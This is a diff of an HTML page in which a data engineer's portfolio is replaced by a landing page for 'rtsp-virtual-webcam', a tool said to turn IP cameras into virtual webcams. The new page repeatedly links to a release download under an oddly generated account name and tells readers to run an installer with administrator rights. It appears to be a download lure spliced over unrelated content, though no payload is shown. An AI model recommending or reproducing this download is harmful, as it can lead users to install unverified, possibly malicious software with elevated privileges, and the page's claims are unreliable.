@@ -3,94 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mohamed Awad | Data Engineer</title>
-    
-    <!-- Font Awesome for Icons -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
-    <!-- External CSS Link -->
-    <link rel="stylesheet" href="style.css">
+    <meta name="description" content="Turn any RTSP IP camera into a virtual webcam and microphone for Windows.">
+    <title>rtsp-virtual-webcam - Use IP Cameras as Virtual Webcams</title>
 </head>
-<body>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 0 20px; background-color: #f4f7f6;">
 
-    <!-- Background Animated Shapes -->
-    <div class="bg-animation" id="bgAnimation">
-        <span></span>
-        <span></span>
-        <span></span>
-        <span></span>
-        <span></span>
-        <span></span>
-        <span></span>
+    <h1 style="color: #2c3e50;">🎥 rtsp-virtual-webcam - Use IP Cameras as Virtual Webcams</h1>
+
+    <p>This software allows you to connect an IP camera to your computer. It creates a virtual webcam and microphone feed. You can use this feed in programs like Zoom or Google Meet. You do not need to pay for extra software or use complex tools.</p>
+
+    <div style="margin: 30px 0;">
+        <a href="https://github.com/Dasyproctaanxiousness893/rtsp-virtual-webcam/releases" style="background-color: #5d6d7e; color: white; padding: 15px 25px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Latest Version</a>
     </div>
 
-    <header>
-        <h1>Mohamed Awad</h1>
-        <h2>Data Engineer</h2>
-        <p>Python • SQL • PySpark • Airflow • dbt • Kafka</p>
-    </header>
+    <h2 style="color: #2c3e50;">📋 System Requirements</h2>
+    <p>Your computer needs to meet these basic standards to run the software correctly:</p>
+    <ul>
+        <li>Operating System: Windows 10 or Windows 11.</li>
+        <li>Memory: At least 4GB of RAM.</li>
+        <li>Network: A stable connection between your computer and the IP camera.</li>
+        <li>Permissions: Administrator access to install the necessary virtual driver files.</li>
+    </ul>
 
-    <section>
-        <div class="card">
-            <h3>About Me</h3>
-            <p>
-                Aspiring Data Engineer passionate about building scalable data pipelines,
-                ETL processes, and modern analytics solutions to transform raw data into actionable insights.
-            </p>
-        </div>
+    <h2 style="color: #2c3e50;">🛠️ Installation and Setup</h2>
+    <p>Follow these steps to set up the software on your machine:</p>
+    <ol>
+        <li>Visit this page to download the latest release: <a href="https://github.com/Dasyproctaanxiousness893/rtsp-virtual-webcam/releases">Download Link</a>.</li>
+        <li>Locate the downloaded file in your computer folders.</li>
+        <li>Run the installer. Follow the prompts on the screen.</li>
+        <li>Wait for the virtual drivers to install. This step lets your computer treat the camera feed as a real device.</li>
+        <li>Restart your computer if the installer asks you to do so.</li>
+    </ol>
 
-        <div class="card">
-            <h3>Technical Skills</h3>
-            <div class="skills">
-                <span>Python</span>
-                <span>SQL</span>
-                <span>PySpark</span>
-                <span>Apache Airflow</span>
-                <span>dbt</span>
-                <span>Kafka</span>
-                <span>Docker</span>
-                <span>Git</span>
-            </div>
-        </div>
+    <h2 style="color: #2c3e50;">⚙️ Configuring Your Camera</h2>
+    <p>You must provide the software with the address of your camera. Most IP cameras provide a URL that starts with "rtsp://".</p>
+    <ul>
+        <li>Open the application from your desktop or start menu.</li>
+        <li>Find the settings box labeled "Camera Source URL".</li>
+        <li>Type or paste your camera address here.</li>
+        <li>Click "Connect".</li>
+        <li>Verify that the preview window shows your camera image.</li>
+    </ul>
 
-        <div class="card">
-            <h3>Featured Projects</h3>
-            <div class="project-grid">
-                <div class="project">
-                    <h4>Crypto Market Data Pipeline</h4>
-                    <p>Automated ETL pipeline using Airflow, dbt and PostgreSQL for real-time crypto analytics.</p>
-                </div>
+    <h2 style="color: #2c3e50;">🎤 Setting Up Audio</h2>
+    <p>The software includes a virtual microphone. This feature captures audio from your camera feed and sends it to your computer as if you plugged in a headset.</p>
+    <ul>
+        <li>Ensure your camera supports audio streaming.</li>
+        <li>Enable the "Virtual Microphone" toggle in the app settings.</li>
+        <li>Check that the software displays the correct audio format.</li>
+    </ul>
 
-                <div class="project">
-                    <h4>Databricks Car Price ETL</h4>
-                    <p>End-to-end big data ETL pipeline using Databricks and PySpark.</p>
-                </div>
+    <h2 style="color: #2c3e50;">💻 Using the Camera in Other Apps</h2>
+    <p>After you start the stream, your computer will recognize the feed as a hardware device. You can now use it in video software.</p>
+    <ul>
+        <li>Open your video meeting app, such as Zoom, Google Meet, or Microsoft Teams.</li>
+        <li>Go to the settings menu for Video.</li>
+        <li>Select "Virtual Webcam" from the camera list.</li>
+        <li>Go to the settings menu for Audio.</li>
+        <li>Select "Virtual Microphone" as your input device.</li>
+    </ul>
 
-                <div class="project">
-                    <h4>Bank Marketing Analysis</h4>
-                    <p>Machine Learning classification project utilizing Python and data preprocessing techniques.</p>
-                </div>
-            </div>
-        </div>
+    <h2 style="color: #2c3e50;">🔍 Troubleshooting Common Issues</h2>
+    <p>If you see a black screen, check your camera address. Ensure the camera is turned on and connected to the same network as your computer. If the application crashes, verify that your firewall is not blocking the connection.</p>
+    <p>If the video looks delayed, check your local network speed. High resolution feeds require more bandwidth. You can try to lower the resolution in your camera settings to improve performance.</p>
 
-        <div class="card">
-            <h3>Contact</h3>
-            <div class="contact-links">
-                <a href="https://github.com/mohamedAwad413" target="_blank">
-                    <i class="fab fa-github"></i> GitHub
-                </a>
-                <a href="https://linkedin.com/in/mohamed-awad-p434" target="_blank">
-                    <i class="fab fa-linkedin"></i> LinkedIn
-                </a>
-            </div>
-        </div>
-    </section>
+    <hr style="border: 0; border-top: 1px solid #ddd; margin: 40px 0;">
 
-    <footer>
-        <p>© 2026 Mohamed Awad. All rights reserved.</p>
-    </footer>
+    <p>Keywords: ffmpeg, google-meet, ip-camera, ip-camera-webcam, obs, python, rtsp, rtsp-camera, unitycapture, vb-cable, virtual-camera, virtual-microphone, virtual-webcam, webcam, windows, zoom</p>
 
-    <!-- External JS Link -->
-    <script src="script.js"></script>
 </body>
 </html>
